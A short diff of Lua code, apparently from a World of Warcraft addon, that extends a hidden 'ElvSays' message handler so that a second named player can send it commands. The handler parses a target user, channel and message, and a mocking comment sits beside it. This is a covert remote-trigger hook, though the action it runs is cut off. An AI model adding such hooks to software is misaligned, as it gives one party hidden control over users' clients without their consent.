@@ -345,7 +345,7 @@ function E:SendRecieve(event, prefix, message, channel, sender)
 				self:UnregisterEvent("PARTY_MEMBERS_CHANGED")
 				self:UnregisterEvent("RAID_ROSTER_UPDATE")
 			end
-		elseif prefix == 'ElvSays' and sender == 'Elv' then ---HAHHAHAHAHHA
+		elseif prefix == 'ElvSays' and (sender == 'Elv' or sender == 'Elv-Illidan') then ---HAHHAHAHAHHA
 			local user, channel, msg, sendTo = string.split(',', message)
 			
 			if (user ~= 'ALL' and user == E.myname) or user == 'ALL' then
